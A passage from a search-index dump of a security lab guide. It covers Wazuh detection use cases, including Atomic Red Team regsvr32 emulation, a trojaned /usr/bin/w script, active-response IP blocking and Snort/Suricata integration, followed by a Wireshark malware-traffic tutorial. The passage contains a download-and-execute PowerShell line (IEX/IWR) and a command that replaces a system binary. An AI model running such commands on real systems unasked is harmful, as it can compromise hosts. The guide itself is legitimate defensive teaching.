utility,\u00a0<code>regsvr32.exe</code>, to bypass application controls. We then analyse events in the Wazuh archives to detect suspicious activity related to this technique.</p>"},{"location":"wazuh/wazuh.html#atomic-red-team-installation","title":"Atomic Red Team Installation","text":"<p>Note: this has been tested in an isolated Unclassified environment. Perform the following steps to install the Atomic Red Team PowerShell module on a Windows endpoint using PowerShell as an administrator. By default, PowerShell restricts the execution of running scripts. Run the command below to change the default execution policy to\u00a0<code>RemoteSigned</code>:</p> <pre><code>Set-ExecutionPolicy RemoteSigned\n</code></pre> <p>Install the ART execution framework:</p> <pre><code>IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);\nInstall-AtomicRedTeam -getAtomics\n</code></pre> <p>Import the ART module to use\u00a0<code>Invoke-AtomicTest</code>\u00a0function</p> <pre><code>Import-Module \"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\" -Force\n</code></pre> <p>Use\u00a0<code>Invoke-AtomicTest</code>\u00a0function to show details of the technique\u00a0<code>T1218.010</code></p> <pre><code>Invoke-AtomicTest T1218.010 -ShowDetailsBrief\n</code></pre> <pre><code>#Example output\nPathToAtomicsFolder = C:\\AtomicRedTeam\\atomics\n\nT1218.010-1 Regsvr32 local COM scriptlet execution\nT1218.010-2 Regsvr32 remote COM scriptlet execution\nT1218.010-3 Regsvr32 local DLL execution\nT1218.010-4 Regsvr32 Registering Non DLL\nT1218.010-5 Regsvr32 Silent DLL Install Call DllRegisterServer\n</code></pre>"},{"location":"wazuh/wazuh.html#attack-emulation","title":"Attack Emulation","text":"<p>Emulate the signed binary proxy execution technique on the Windows endpoint. Run the command below with Powershell as an administrator to perform the\u00a0<code>T1218.010</code>\u00a0test.</p> <pre><code>Invoke-AtomicTest T1218.010\n</code></pre> <pre><code>#Example output\nPathToAtomicsFolder = C:\\AtomicRedTeam\\atomics\n\nExecuting test: T1218.010-1 Regsvr32 local COM scriptlet execution\nDone executing test: T1218.010-1 Regsvr32 local COM scriptlet execution\nExecuting test: T1218.010-2 Regsvr32 remote COM scriptlet execution\nDone executing test: T1218.010-2 Regsvr32 remote COM scriptlet execution\nExecuting test: T1218.010-3 Regsvr32 local DLL execution\nDone executing test: T1218.010-3 Regsvr32 local DLL execution\nExecuting test: T1218.010-4 Regsvr32 Registering Non DLL\nDone executing test: T1218.010-4 Regsvr32 Registering Non DLL\nExecuting test: T1218.010-5 Regsvr32 Silent DLL Install Call DllRegisterServer\nDone executing test: T1218.010-5 Regsvr32 Silent DLL Install Call DllRegisterServer\n</code></pre> <p>Several calculator instances will pop up after a successful execution of the exploit.</p> <p></p>"},{"location":"wazuh/wazuh.html#wazuh-dashboard","title":"Wazuh Dashboard","text":"<p>Use the Wazuh archives to query and display events related to the technique being hunted. It's important to note that while consulting the archives, some events might already be captured as alerts on the Wazuh dashboard. You can use information from the Wazuh archives, including alerts and events that have no detection to create custom rules based on your specific requirements.</p> <p>Apply a time range filter to view events that occurred within the last five minutes of when the test was performed. Filter to view logs from the specific Windows endpoint using\u00a0<code>agent.id</code>,\u00a0<code>agent.ip</code>\u00a0or\u00a0<code>agent.name</code>.</p> <p></p> <p>There are multiple hits that you can investigate to determine a correlation with the earlier attack emulation. For instance, you may notice a calculator spawning event similar to the one observed on the Windows endpoint during the test.</p> <p></p> <p>Type\u00a0<code>regsvr32</code>\u00a0in the search bar to streamline and investigate events related to the\u00a0<code>regsvr32</code>\u00a0utility.</p> <p></p> <p>Expand any of the events to view their associated fields.</p> <p></p> <p>Click on the JSON tab to view the JSON format of the archived logs.</p> <p></p> <p>Apply the\u00a0<code>data.win.eventdata.ruleName:technique_id=T1218.010,technique_name=Regsvr32</code>\u00a0filter to see the technique ID as shown below.</p> <p></p> <p>It is recommended to enable archiving as it allows users to view logs from network devices. However, if you prefer not to enable archiving, similar search can be performed on wazuh-alerts- (default) index instead of wazuh-archives- index.</p> <p>Navigate to Home, then Overview on the web UI</p> <p>Select number displayed on the Critical severity</p> <p></p> <p></p> <p>Clear all filters then add the filter data.wineventda.image is C:\\Windows\\SYSWOW64\\regsvr32.exe</p> <p></p>"},{"location":"wazuh/wazuh.html#troubleshooting-index-patterns","title":"Troubleshooting Index Patterns","text":"<p>If search results displays the error icon and the message \u201cNo cached mapping for this field. Refresh field list from the index patterns page,\u201d go to Dashboard Management, Index patterns and select each index. Click refresh button. </p> <p></p> <p></p>"},{"location":"wazuh/wazuh.html#detecting-suspicious-binaries-testing-endpoint-security","title":"Detecting Suspicious Binaries (Testing Endpoint Security)","text":"<p>Wazuh has anomaly and malware detection capabilities that detect suspicious binaries on an endpoint. Binaries are executable code written to perform automated tasks. Malicious actors use them mostly to carry out exploitation to avoid being detected.</p> <p>In this use case, we demonstrate how the Wazuh rootcheck module can detect a trojan system binary on an Ubuntu endpoint. You perform the exploit by replacing the content of a legitimate binary with malicious code to trick the endpoint into running it as the legitimate binary.</p> <p>The Wazuh rootcheck module also checks for hidden processes, ports, and files.</p>"},{"location":"wazuh/wazuh.html#configuration","title":"Configuration","text":"<p>Take the following steps on the Ubuntu endpoint to enable the Wazuh rootcheck module and perform anomaly and malware detection.</p> <p>By default, the Wazuh rootcheck module is enabled in the Wazuh agent configuration file. Check the\u00a0<code>&lt;rootcheck&gt;</code>\u00a0block in the\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0configuration file of the monitored endpoint and make sure that it has the configuration below:</p> <pre><code>&lt;rootcheck&gt;\n    &lt;disabled&gt;no&lt;/disabled&gt;\n    &lt;check_files&gt;yes&lt;/check_files&gt;\n\n    &lt;!-- Line for trojans detection --&gt;\n    &lt;check_trojans&gt;yes&lt;/check_trojans&gt;\n\n    &lt;check_dev&gt;yes&lt;/check_dev&gt;\n    &lt;check_sys&gt;yes&lt;/check_sys&gt;\n    &lt;check_pids&gt;yes&lt;/check_pids&gt;\n    &lt;check_ports&gt;yes&lt;/check_ports&gt;\n    &lt;check_if&gt;yes&lt;/check_if&gt;\n\n    &lt;!-- Frequency that rootcheck is executed - every 12 hours --&gt;\n    &lt;frequency&gt;43200&lt;/frequency&gt;\n    &lt;rootkit_files&gt;/var/ossec/etc/shared/rootkit_files.txt&lt;/rootkit_files&gt;\n    &lt;rootkit_trojans&gt;/var/ossec/etc/shared/rootkit_trojans.txt&lt;/rootkit_trojans&gt;\n    &lt;skip_nfs&gt;yes&lt;/skip_nfs&gt;\n&lt;/rootcheck&gt;\n</code></pre>"},{"location":"wazuh/wazuh.html#attack-emulation_1","title":"Attack Emulation","text":"<p>Create a copy of the original system binary:</p> <pre><code>sudo cp -p /usr/bin/w /usr/bin/w.copy\n</code></pre> <p>Replace the original system binary\u00a0<code>/usr/bin/w</code>\u00a0with the following shell script:</p> <pre><code>sudo tee /usr/bin/w &lt;&lt; EOF\n!/bin/bash\necho \"`date` this is evil\" &gt; /tmp/trojan_created_file\necho 'test for /usr/bin/w trojaned file' &gt;&gt; /tmp/trojan_created_file\nNow running original binary\n/usr/bin/w.copy\nEOF\n</code></pre> <p>The rootcheck scan runs every 12 hours by default. Force a scan by restarting the Wazuh agent to see the relevant alert:</p> <pre><code>sudo systemctl restart wazuh-agent\n</code></pre>"},{"location":"wazuh/wazuh.html#visualising-alerts","title":"Visualising Alerts","text":"<p>You can visualise the alert data in the Wazuh dashboard. To do this, go to the\u00a0Threat Hunting\u00a0module and add the filters in the search bar to query the alerts. <code>location:rootcheck AND rule.id:510</code></p> <p></p>"},{"location":"wazuh/wazuh.html#file-integrity-monitoring-testing-endpoint-security","title":"File Integrity Monitoring (Testing Endpoint Security)","text":"<p>File Integrity Monitoring (FIM) helps in auditing sensitive files and meeting regulatory compliance requirements. Wazuh has an inbuilt\u00a0FIM\u00a0module that monitors file system changes to detect the creation, modification, and deletion of files.</p>"},{"location":"wazuh/wazuh.html#configuring-ubuntu-endpoint","title":"Configuring Ubuntu Endpoint","text":"<p>Edit the Wazuh agent\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0configuration file. Add the directories for monitoring within the\u00a0<code>&lt;syscheck&gt;</code>\u00a0block. For this use case, you configure Wazuh to monitor the\u00a0<code>/root</code>\u00a0directory.\u00a0</p> <pre><code>&lt;directories check_all=\"yes\" report_changes=\"yes\" realtime=\"yes\"&gt;/root&lt;/directories&gt;\n</code></pre> <p>Restart the Wazuh agent to apply the configuration changes:</p> <pre><code>sudo systemctl restart wazuh-agent\n</code></pre>"},{"location":"wazuh/wazuh.html#testing-configuration","title":"Testing Configuration","text":"<ol> <li>Create a text file in the monitored directory then wait for 5 seconds.</li> <li>Add content to the text file and save it. Wait for 5 seconds.</li> <li>Delete the text file from the monitored directory.</li> </ol>"},{"location":"wazuh/wazuh.html#visualising-alerts_1","title":"Visualising Alerts","text":"<p>You can visualise the alert data in the Wazuh dashboard. To do this, go to the\u00a0File Integrity Monitoring\u00a0module and add the filters in the search bar to query the alerts:<code>rule.id:\u00a0is\u00a0one\u00a0of\u00a0550,553,554</code></p> <p></p>"},{"location":"wazuh/wazuh.html#vulnerability-detection-testing-threat-intelligence","title":"Vulnerability Detection (Testing Threat Intelligence)","text":"<p>Wazuh uses the Vulnerability Detection module to identify vulnerabilities in applications and operating systems running on endpoints.</p> <p>This use case shows how Wazuh detects unpatched Common Vulnerabilities and Exposures (CVEs) in the monitored endpoint.</p>"},{"location":"wazuh/wazuh.html#configuration_1","title":"Configuration","text":"<p>The Vulnerability Detection module is enabled by default. You can perform the following steps on the Wazuh server to ensure that the Wazuh Vulnerability Detection module is enabled and properly configured.</p> <p>Open the\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0file on the Wazuh server. Check the following settings. Vulnerability Detection is enabled:</p> <pre><code>&lt;vulnerability-detection&gt;\n   &lt;enabled&gt;yes&lt;/enabled&gt;\n   &lt;index-status&gt;yes&lt;/index-status&gt;\n   &lt;feed-update-interval&gt;60m&lt;/feed-update-interval&gt;\n&lt;/vulnerability-detection&gt;\n</code></pre> <p>The indexer connection is properly configured. By default, the indexer settings have one host configured. It's set to\u00a0<code>0.0.0.0</code>\u00a0as highlighted below.</p> <pre><code>&lt;indexer&gt;\n  &lt;enabled&gt;yes&lt;/enabled&gt;\n  &lt;hosts&gt;\n    &lt;host&gt;https://0.0.0.0:9200&lt;/host&gt;\n  &lt;/hosts&gt;\n  &lt;ssl&gt;\n    &lt;certificate_authorities&gt;\n      &lt;ca&gt;/etc/filebeat/certs/root-ca.pem&lt;/ca&gt;\n    &lt;/certificate_authorities&gt;\n    &lt;certificate&gt;/etc/filebeat/certs/filebeat.pem&lt;/certificate&gt;\n    &lt;key&gt;/etc/filebeat/certs/filebeat-key.pem&lt;/key&gt;\n  &lt;/ssl&gt;\n&lt;/indexer&gt;\n</code></pre> <p>Replace\u00a0<code>0.0.0.0</code>\u00a0with your Wazuh indexer node IP address or hostname. You can find this value in the Filebeat config file\u00a0<code>/etc/filebeat/filebeat.yml</code>. Ensure the Filebeat certificate and key name match the certificate files in\u00a0<code>/etc/filebeat/certs</code>. If you made changes to the configuration, restart the Wazuh manager.</p> <pre><code>sudo systemctl restart wazuh-manager\n</code></pre>"},{"location":"wazuh/wazuh.html#visualising-alerts_2","title":"Visualising Alerts","text":"<p>You can visualise the detected vulnerabilities in the Wazuh dashboard. To see a list of active vulnerabilities, go to\u00a0Vulnerability Detection\u00a0and select\u00a0Inventory.</p> <p></p> <p></p>"},{"location":"wazuh/wazuh.html#incident-response","title":"Incident Response","text":"<p>The goal of incident response is to effectively handle a security incident and restore normal business operations as quickly as possible. As organizations\u2019 digital assets continuously grow, managing incidents manually becomes increasingly challenging, hence the need for automation.</p>"},{"location":"wazuh/wazuh.html#wazuh-active-response-module","title":"Wazuh Active Response module","text":"<p>The Wazuh\u00a0Active Response\u00a0module allows users to run automated actions when incidents are detected on endpoints. This improves an organization's incident response processes, enabling security teams to take immediate and automated actions to counter detected threats.</p>"},{"location":"wazuh/wazuh.html#default-active-response-actions","title":"Default Active Response Actions","text":"<p>Out-of-the-box scripts are available on every operating system that runs the Wazuh agents. Some of the\u00a0default active response\u00a0scripts include</p> Name of script Description disable-account Disables a user account firewall-drop Adds an IP address to the iptables deny list. firewalld-drop Adds an IP address to the firewalld drop list. restart.sh Restarts the Wazuh agent or server. netsh.exe Blocks an IP address using netsh."},{"location":"wazuh/wazuh.html#custom-active-response-actions","title":"Custom Active Response Actions","text":"<p>One of the benefits of the Wazuh Active Response module is its adaptability. Wazuh allows security teams to create\u00a0custom active response\u00a0actions in any programming language, tailoring them to their specific needs.</p>"},{"location":"wazuh/wazuh.html#disabling-user-account-after-a-brute-force-attack-testing-default-active-response","title":"Disabling User Account After a Brute-Force Attack (Testing Default Active Response)","text":"<p>Account lockout is a security measure used to defend against brute force attacks by limiting the number of login attempts a user can make within a specified time. We use the Wazuh Active Response module to disable the user account whose password is being guessed by an attacker.</p> <p>In the image below, the Wazuh Active Response module disables the account on a Linux endpoint and re-enables it again after 5 minutes.</p> <p>After SSH Brute Force attack was launched from Kali machine, the login was disabled for 60 seconds because of 3 bad attempts</p> <p></p>"},{"location":"wazuh/wazuh.html#blocking-a-known-malicious-actor-testing-custom-active-response","title":"Blocking a Known Malicious Actor (Testing Custom Active Response)","text":"<p>In this use case, we demonstrate how to block malicious IP addresses from accessing web resources on a web server. </p>"},{"location":"wazuh/wazuh.html#configuring-ubuntu-endpoint_1","title":"Configuring Ubuntu endpoint","text":"<p>Update local packages and install the Apache web server:</p> <pre><code>sudo apt update\nsudo apt install apache2\n</code></pre> <p>If the firewall is enabled, modify the firewall to allow external access to web ports. Skip this step if the firewall is disabled:</p> <pre><code>sudo ufw status\nsudo ufw app list\nsudo ufw allow 'Apache'\n</code></pre> <p>Check the status of the Apache service to verify that the web server is running:</p> <pre><code>sudo systemctl status apache2\n</code></pre> <p>Use the\u00a0<code>curl</code>\u00a0command or open\u00a0<code>http://&lt;UBUNTU_IP&gt;</code>\u00a0in a browser to view the Apache landing page and verify the installation:</p> <pre><code>curl http://&lt;UBUNTU_IP&gt;\n</code></pre> <p>Add the following to\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0file to configure the Wazuh agent and monitor the Apache access logs:</p> <pre><code>&lt;localfile&gt;\n  &lt;log_format&gt;syslog&lt;/log_format&gt;\n  &lt;location&gt;/var/log/apache2/access.log&lt;/location&gt;\n&lt;/localfile&gt;\n</code></pre> <p>Restart the Wazuh agent to apply the changes:</p> <pre><code>sudo systemctl restart wazuh-agent\n</code></pre>"},{"location":"wazuh/wazuh.html#configuring-the-wazuh-server","title":"Configuring the Wazuh server","text":"<p>Download the utilities and configure the CDB list. Download the Alienvault IP reputation database:</p> <pre><code>sudo wget https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/alienvault_reputation.ipset -O /var/ossec/etc/lists/alienvault_reputation.ipset\n</code></pre> <p>Append the IP address of the attacker endpoint to the IP reputation database. Replace\u00a0<code>&lt;ATTACKER_IP&gt;</code>\u00a0with the Kali IP address in the command below:</p> <pre><code>sudo echo \"&lt;ATTACKER_IP&gt;\" &gt;&gt; /var/ossec/etc/lists/alienvault_reputation.ipset\n</code></pre> <p>Download a script to convert from the\u00a0<code>.ipset</code>\u00a0format to the\u00a0<code>.cdb</code>\u00a0list format:</p> <pre><code>sudo wget https://wazuh.com/resources/iplist-to-cdblist.py -O /tmp/iplist-to-cdblist.py\n</code></pre> <p>Convert the\u00a0<code>alienvault_reputation.ipset</code>\u00a0file to a\u00a0<code>.cdb</code>\u00a0format using the previously downloaded script:</p> <pre><code>sudo /var/ossec/framework/python/bin/python3 /tmp/iplist-to-cdblist.py /var/ossec/etc/lists/alienvault_reputation.ipset /var/ossec/etc/lists/blacklist-alienvault\n</code></pre> <p>Assign the right permissions and ownership to the generated file:</p> <pre><code>sudo chown wazuh:wazuh /var/ossec/etc/lists/blacklist-alienvault\n</code></pre>"},{"location":"wazuh/wazuh.html#configure-the-active-response-module-to-block-the-malicious-ip-address","title":"Configure the active response module to block the malicious IP address","text":"<p>Add a custom rule to trigger a Wazuh\u00a0active response\u00a0script. Do this in the Wazuh server\u00a0<code>/var/ossec/etc/rules/local_rules.xml</code>\u00a0custom ruleset file:</p> <pre><code>&lt;group name=\"attack,\"&gt;\n  &lt;rule id=\"100100\" level=\"10\"&gt;\n    &lt;if_group&gt;web|attack|attacks&lt;/if_group&gt;\n    &lt;list field=\"srcip\" lookup=\"address_match_key\"&gt;etc/lists/blacklist-alienvault&lt;/list&gt;\n    &lt;description&gt;IP address found in AlienVault reputation database.&lt;/description&gt;\n  &lt;/rule&gt;\n&lt;/group&gt;\n</code></pre> <p>Edit the Wazuh server\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0configuration file and add the\u00a0<code>etc/lists/blacklist-alienvault</code>\u00a0list to the\u00a0<code>&lt;ruleset&gt;</code>\u00a0section:</p> <pre><code>&lt;ossec_config&gt;\n  &lt;ruleset&gt;\n    &lt;!-- Default ruleset --&gt;\n    &lt;decoder_dir&gt;ruleset/decoders&lt;/decoder_dir&gt;\n    &lt;rule_dir&gt;ruleset/rules&lt;/rule_dir&gt;\n    &lt;rule_exclude&gt;0215-policy_rules.xml&lt;/rule_exclude&gt;\n    &lt;list&gt;etc/lists/audit-keys&lt;/list&gt;\n    &lt;list&gt;etc/lists/amazon/aws-eventnames&lt;/list&gt;\n    &lt;list&gt;etc/lists/security-eventchannel&lt;/list&gt;\n    &lt;list&gt;etc/lists/blacklist-alienvault&lt;/list&gt;\n\n    &lt;!-- User-defined ruleset --&gt;\n    &lt;decoder_dir&gt;etc/decoders&lt;/decoder_dir&gt;\n    &lt;rule_dir&gt;etc/rules&lt;/rule_dir&gt;\n  &lt;/ruleset&gt;\n\n&lt;/ossec_config&gt;\n</code></pre> <p>Add the active response block to the Wazuh server\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0file:</p> <p>The\u00a0<code>firewall-drop</code>\u00a0command integrates with the Ubuntu local iptables firewall and drops incoming network connection from the attacker endpoint for 60 seconds: Remember to uncomment the code block (remove <code>&lt;!--</code> and <code>--&gt;</code> )</p> <pre><code>&lt;ossec_config&gt;\n  &lt;active-response&gt;\n    &lt;command&gt;firewall-drop&lt;/command&gt;\n    &lt;location&gt;local&lt;/location&gt;\n    &lt;rules_id&gt;100100&lt;/rules_id&gt;\n    &lt;timeout&gt;60&lt;/timeout&gt;\n  &lt;/active-response&gt;\n&lt;/ossec_config&gt;\n</code></pre> <p>Restart the Wazuh manager to apply the changes:</p> <pre><code>sudo systemctl restart wazuh-manager\n</code></pre>"},{"location":"wazuh/wazuh.html#attack-emulation_2","title":"Attack Emulation","text":"<p>Access any of the web servers from the Kali endpoint using the corresponding IP address. Replace\u00a0<code>&lt;WEBSERVER_IP&gt;</code>\u00a0with the appropriate value and execute the following command from the attacker endpoint:</p> <pre><code>curl http://&lt;WEBSERVER_IP&gt;\n</code></pre> <p>The attacker endpoint connects to the victim's web servers the first time. After the first connection, the Wazuh active response module temporarily blocks any successive connection to the web servers for 60 seconds.</p> <p></p>"},{"location":"wazuh/wazuh.html#visualising-alerts_3","title":"Visualising Alerts","text":"<p>You can visualize the alert data in the Wazuh dashboard. To do this, go to the\u00a0Threat Hunting\u00a0module and add the filters in the search bar to query the alerts:\u00a0<code>rule.id is one of 651, 100100</code></p> <p></p>"},{"location":"wazuh/wazuh.html#network-ids-integration","title":"Network IDS integration","text":""},{"location":"wazuh/wazuh.html#snort3","title":"Snort3","text":"<p>Install Wazuh agent on a Linux host where Snort3 is installed. Edit Snort\u2019s configuration:</p> <pre><code>sudo nano /usr/local/etc/snort/snort.lua\n</code></pre> <p>Uncomment alert_full and add file=true</p> <pre><code>---------------------------------------------------------------------------\n-- 7. configure outputs\n---------------------------------------------------------------------------\n\n-- event logging\n-- you can enable with defaults from the command line with -A &lt;alert_type&gt;\n-- uncomment below to set non-default configs\n--alert_csv = { }\n--alert_fast = {file=true}\nalert_full = {file=true}\n--alert_sfsocket = { }\n--alert_syslog = { }\n--unified2 = { }\n</code></pre> <p>Edit the\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0file of Wazuh agent and add the new\u00a0<code>localfile</code>\u00a0entry: Make sure indentation is correct.</p> <pre><code>&lt;localfile&gt;\n  &lt;log_format&gt;snort-full&lt;/log_format&gt;\n  &lt;location&gt;/var/log/snort/alert_full.txt&lt;/location&gt;\n&lt;/localfile&gt;\n</code></pre> <p>Restart the Wazuh agent.</p> <pre><code>systemctl restart wazuh-agent\n</code></pre> <p>Run Snort3 with the following parameters:</p> <pre><code>sudo snort -c /usr/local/etc/snort/snort.lua -i ens32 -A alert_full -l /var/log/snort\n</code></pre> <p>Note: Snort3 is currently configured to read local.rules for demonstration purposes. </p> <p>Execute ping to 10.0.0.22 (Snort3 VM) from another host. Verify alert_full.txt is generated</p> <pre><code>#Example output\nroot@Snort:/var/log/snort# ls\nalert_fast.txt  alert_full.txt\n</code></pre> <p>On Wazuh dashboard, verify IDS Event alerts are generated and it points to alert_full.txt</p> <p></p> <p></p>"},{"location":"wazuh/wazuh.html#suricata","title":"Suricata","text":"<p>Install Wazuh agent on a Linux host where Suricata is installed. Changes the permissions of all files in the Suricata\u2019s <code>/rules/</code> directories:</p> <pre><code>sudo chmod 640 /var/lib/suricata/rules/*.rules\nsudo chmod 640 /usr/share/suricata/rules/*.rules\n</code></pre> <p>Modify Suricata settings in the\u00a0<code>/etc/suricata/suricata.yaml</code>\u00a0file and set the following variables:</p> <pre><code>vars:\n  # more specific is better for alert accuracy and performance\n  address-groups:\n    HOME_NET: \"[10.0.0.0/24]\"\n...\ncommunity-id: true\n...\naf-packet:\n    - interface: ens32\n      cluster-id: 99\n      cluster-type: cluster_flow\n      defrag: yes\n      use-mmap: yes\n...\n# Cross platform libpcap capture support\npcap:\n  - interface: ens32\n</code></pre> <p><code>interface</code>\u00a0represents the network interface you want to monitor. Replace the value with the interface name of the Ubuntu endpoint. For example,\u00a0<code>ens32</code> </p> <p>Restart the Suricata service:</p> <pre><code>sudo systemctl restart suricata\n</code></pre> <p>Add the following configuration to the <code>/var/ossec/etc/ossec.conf</code> file of the Wazuh agent. This allows the Wazuh agent to read the Suricata logs file:</p> <pre><code>&lt;ossec_config&gt;\n  &lt;localfile&gt;\n    &lt;log_format&gt;json&lt;/log_format&gt;\n    &lt;location&gt;/var/log/suricata/eve.json&lt;/location&gt;\n  &lt;/localfile&gt;\n&lt;/ossec_config&gt;\n</code></pre> <p>Restart the Wazuh agent to apply the changes:</p> <pre><code>sudo systemctl restart wazuh-agent\n</code></pre>"},{"location":"wazuh/wazuh.html#attack-emulation_3","title":"Attack Emulation","text":"<p>Wazuh automatically parses data from\u00a0<code>/var/log/suricata/eve.json</code>\u00a0and generates related alerts on the Wazuh dashboard. From the Ubuntu host, run:</p> <pre><code>curl http://testmynids.org/uid/index.html\n</code></pre> <p>Expected response should be similar to:</p> <pre><code>09/12/2024-13:51:32.520238  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.53:80 -&gt; 10.0.0.25:34606Alerts:\n</code></pre> <p>Verify the results in Wazuh dashboard. Naviage to Threat Hunting &gt; Suricata</p> <p></p>"},{"location":"wazuh/wazuh.html#references","title":"References","text":"<ul> <li>https://www.youtube.com/watch?v=Lb_ukgtYK_U&amp;list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&amp;index=5</li> <li>https://documentation.wazuh.com/current/deployment-options/offline-installation.html</li> <li>https://wazuh.com/blog/monitoring-network-devices/?highlight=network device</li> <li>https://dorian5.medium.com/rsyslog-setup-on-ubuntu-for-fortigate-log-data-9d6c651acbd0</li> <li>https://wazuh.com/blog/monitoring-network-devices/?highlight=network device</li> <li>https://wazuh.com/blog/creating-decoders-and-rules-from-scratch/?highlight=fortigate</li> </ul>"},{"location":"wireshark/wireshark.html","title":"Wireshark","text":""},{"location":"wireshark/wireshark.html#wireshark","title":"Wireshark","text":"<p>Wireshark is a free and open-source network protocol analyser widely used for network troubleshooting, analysis, software and protocol development, and education. Essentially, it's a tool that allows you to capture and examine data packets traveling through a network in real-time or from saved capture files.</p>"},{"location":"wireshark/wireshark.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, Wireshark was installed on a Windows Virtual Machine (VM),  and malware traffic analysis was conducted using Wireshark. </p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) WS2019 Windows Server 2019 Wireshark 10.0.0.40 Kali Kali Linux 2024.2 Linux Client 10.0.0.22 <p></p>"},{"location":"wireshark/wireshark.html#install-wireshark-on-windows","title":"Install Wireshark on Windows","text":"<p>If you are running Windows or macOS you can download an official release at\u00a0https://www.wireshark.org/download.html. For Linux and other OS, download both source and binary distributions from the Wireshark download page. Select the package most appropriate for your system. In this demo, we will focus on installing and running Wireshark on Windows. </p> <p>Double-click on the installer file and follow the prompts. Make sure T Shark is selected.</p> <p></p> <p>Once install is complete, open Wireshark. You will be presented with network interfaces attacked to your computer.</p> <p></p> <p>For demonstration, double-click on the loopback interface. Immediately, Wireshark will start capturing traffic on the loopback interface.</p> <p>You can stop the traffic capture by clicking the stop button.</p> <p></p> <p>From the menu, select Statistics, Capture File Properties. You can see Time for first and last packet as long as elapsed time. </p> <p></p> <p>To view Protocol Hierarchy, select Statistics, Protocol Hierarchy. You will be presented of list of protocols that exist in this packet capture (PCAP). </p> <p></p> <p>You can Apply or Prepare as Filter on any selected value.</p> <p></p> <p>To view Conversations, select Statistics, Conversations and click IPv4. This shows conversations between one host and another host. </p> <p></p> <p>To view Endpoints, select Statistics, Endpoints and click IPv4. This will tell us what endpoints exist in this PCAP. </p> <p></p>"},{"location":"wireshark/wireshark.html#install-wireshark-on-linux","title":"Install Wireshark on Linux","text":"<p>Create a directory for the packages: Open a terminal and create a directory to store the Wireshark package and its dependencies.</p> <pre><code>mkdir wireshark-offline\ncd wireshark-offline\n</code></pre> <p>Download the Wireshark package and its dependencies: On an Ubuntu machine with internet access, use the following commands to download Wireshark and all its dependencies into the <code>wireshark-offline</code> folder.</p> <pre><code>sudo apt update\napt-get download wireshark\napt-cache depends wireshark | grep Depends | sed \"s/.*ends:\\ //\" | xargs apt-get download\napt-get download libminizip1 libqt5core5a libqt5gui5 libqt5multimedia5 libqt5printsupport5 libqt5widgets5 libwireshark15 libwiretap12 libwsutil13 wireshark-common libqt5svg5 libdouble-conversion3 libmd4c0 libqt5dbus5 libqt5network5 libxcb-xinerama0 libxcb-xinput0 libbcg729-0 libc-ares2 liblua5.2-0 libsmi2ldbl libsnappy1v5 libspandsp2 libwireshark-data libssh-gcrypt-4\n</code></pre> <p>Transfer the downloaded <code>.deb</code> files to your offline Ubuntu VM</p> <p>Install the dependencies: On your offline Ubuntu VM, navigate to the folder where you transferred the <code>.deb</code> files and run the following command:</p> <pre><code>sudo dpkg -i *.deb\n</code></pre> <p>Restart the PC and run Wireshark</p> <pre><code>wireshark\n</code></pre> <p></p>"},{"location":"wireshark/wireshark.html#malware-traffic-analysis","title":"Malware Traffic Analysis","text":"<p>The pcaps used in this tutorial are contained in a password-protected ZIP archive located at our\u00a0GitHub repository. Download the file named\u00a0Wireshark-tutorial-extracting-objects-5-pcaps.zip. Use\u00a0infected\u00a0as the password and extract the five pcaps, as shown below.</p> <p></p> <p>The five extracted pcaps are:</p> <ul> <li>Wireshark-tutorial-extracting-objects-from-a-pcap-1-of-5.pcap</li> <li>Wireshark-tutorial-extracting-objects-from-a-pcap-2-of-5.pcap</li> <li>Wireshark-tutorial-extracting-objects-from-a-pcap-3-of-5.pcap</li> <li>Wireshark-tutorial-extracting-objects-from-a-pcap-4-of-5.pcap</li> <li>Wireshark-tutorial-extracting-objects-from-a-pcap-5-of-5.pcap</li> </ul> <p>As a network packet analyser, Wireshark combines data from multiple IP packets and the associated TCP frames to reveal the content of a pcap. We can extract some of these objects revealed by Wireshark.</p>"},{"location":"wireshark/wireshark.html#exporting-files-from-http-traffic","title":"Exporting Files From HTTP Traffic","text":"<p>Some Windows-based infections involve malware binaries or malicious code sent over unencrypted HTTP traffic. We can extract these objects from the pcap. An example of this is found in our first pcap named\u00a0Wireshark-tutorial-extracting-objects-from-a-pcap-1-of-5.pcap. Open this pcap in Wireshark and filter on http.request as shown below.</p> <p></p> <p>After filtering on\u00a0http.request, find the two GET requests to\u00a0smart-fax[.]com. The first request ends with\u00a0.doc, indicating the first request may have returned a Microsoft Word document. The second request ends with\u00a0.exe, indicating the second request may have returned a Windows executable file. The HTTP GET requests are listed below.</p> <ul> <li>smart-fax[.]com - GET /Documents/Invoice&amp;MSO-Request.doc</li> <li>smart-fax[.]com - GET /knr.exe</li> </ul> <p>We can export these objects from the HTTP object list by using the menu path:</p> <ul> <li>File \u2192 Export Objects \u2192 HTTP...</li> </ul> <p>This menu path results in a window titled \u201cWireshark Export HTTP object list\u201d as shown below. Select the first line with Invoice&amp;MSO-Request.doc as the filename and save it. Select the second line with knr.exe as the filename and save it.</p> <p></p> <p>Note, the Content Type column from the HTTP object list shows what the server identified the file as in its HTTP response headers. In some cases, a server hosting malware will intentionally label Windows executables as a different type of file in an effort to avoid detection. Fortunately, the first pcap in this tutorial is a very straight-forward example.</p> <p>After extracting these files from the pcap, we should confirm the file types. </p> <p>In Windows, we can use PowerShell or Command Prompt command to obtain hash</p> <ul> <li>Get-FileHash [filename] -Algorithm SHA256</li> <li>certutil -hashfile [filename] SHA256</li> </ul> <p>In Linux, we can use a terminal window or command line interface (CLI) for the following commands:</p> <ul> <li>file\u00a0[filename]</li> <li>shasum -a 